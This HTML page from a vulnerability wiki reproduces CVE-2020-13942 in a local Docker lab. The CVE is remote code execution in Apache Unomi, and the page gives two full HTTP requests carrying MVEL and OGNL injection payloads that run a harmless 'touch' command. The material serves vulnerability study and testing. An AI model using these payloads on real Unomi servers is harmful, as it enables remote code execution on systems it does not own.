<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/unomi/CVE-2020-13942/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Apache Unomi Expression Language Injection RCE (CVE-2020-13942) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Apache Unomi Expression Language Injection RCE (CVE-2020-13942)", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduce", url: "#vulnerability-reproduce" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Apache Unomi 表达式注入远程代码执行漏洞（CVE-2020-13942）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../unitalk/unitalk%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../unitalk/unitalk%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        unitalk存在默认弱口令漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="apache-unomi-expression-language-injection-rce-cve-2020-13942">Apache Unomi Expression Language Injection RCE (CVE-2020-13942)<a class="headerlink" href="#apache-unomi-expression-language-injection-rce-cve-2020-13942" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Apache Unomi is a Java Open Source customer data platform, a Java server designed to manage customers, leads and visitors’ data and help personalize customers experiences.</p>
<p>In the versions prior to 1.5.1, Apache Unomi allowed remote attackers to send malicious requests with MVEL and OGNL expressions that could contain arbitrary classes, resulting in Remote Code Execution (RCE) with the privileges of the Unomi application.</p>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Execute following commands to start an Apache Unomi server 1.5.1:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the environment is started, you can access Unomi's API through <code>http://your-ip:8181</code> or <code>https://your-ip:9443</code>.</p>
<h2 id="vulnerability-reproduce">Vulnerability Reproduce<a class="headerlink" href="#vulnerability-reproduce" title="Permanent link">&para;</a></h2>
<p>The vulnerability can be triggered through both ports 8181 and 9443.</p>
<p>Execute arbitrary commands through MVEL expressions:</p>
<div class="highlight"><pre><span></span><code>POST /context.json HTTP/1.1
Host: localhost:8181
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 483

{
    &quot;filters&quot;: [
        {
            &quot;id&quot;: &quot;sample&quot;,
            &quot;filters&quot;: [
                {
                    &quot;condition&quot;: {
                         &quot;parameterValues&quot;: {
                            &quot;&quot;: &quot;script::Runtime r = Runtime.getRuntime(); r.exec(\&quot;touch /tmp/mvel\&quot;);&quot;
                        },
                        &quot;type&quot;: &quot;profilePropertyCondition&quot;
                    }
                }
            ]
        }
    ],
    &quot;sessionId&quot;: &quot;sample&quot;
}
</code></pre></div>
<p>Execute arbitrary commands through OGNL expressions:</p>
<div class="highlight"><pre><span></span><code>POST /context.json HTTP/1.1
Host: localhost:8181
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 1064

{
  &quot;personalizations&quot;:[
    {
      &quot;id&quot;:&quot;gender-test&quot;,
      &quot;strategy&quot;:&quot;matching-first&quot;,
      &quot;strategyOptions&quot;:{
        &quot;fallback&quot;:&quot;var2&quot;
      },
      &quot;contents&quot;:[
        {
          &quot;filters&quot;:[
            {
              &quot;condition&quot;:{
                &quot;parameterValues&quot;:{
                  &quot;propertyName&quot;:&quot;(#runtimeclass = #this.getClass().forName(\&quot;java.lang.Runtime\&quot;)).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\&quot;getRuntime\&quot;)}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\&quot;exec\&quot;)}.{? #this.getParameters()[0].getType().getName().equals(\&quot;java.lang.String\&quot;)}.{? #this.getParameters().length &lt; 2}[0]).(#execmethod.invoke(#rtobj,\&quot;touch /tmp/ognl\&quot;))&quot;,
                  &quot;comparisonOperator&quot;:&quot;equals&quot;,
                  &quot;propertyValue&quot;:&quot;male&quot;
                },
                &quot;type&quot;:&quot;profilePropertyCondition&quot;
              }
            }
          ]
        }
      ]
    }
  ],
  &quot;sessionId&quot;:&quot;sample&quot;
}
</code></pre></div>
<p>Enter the Docker container, you can see that the command has been executed successfully:</p>
<p><img alt="" src="1.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Apache Unomi 表达式注入远程代码执行漏洞（CVE-2020-13942）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../unitalk/unitalk%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../unitalk/unitalk%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        unitalk存在默认弱口令漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>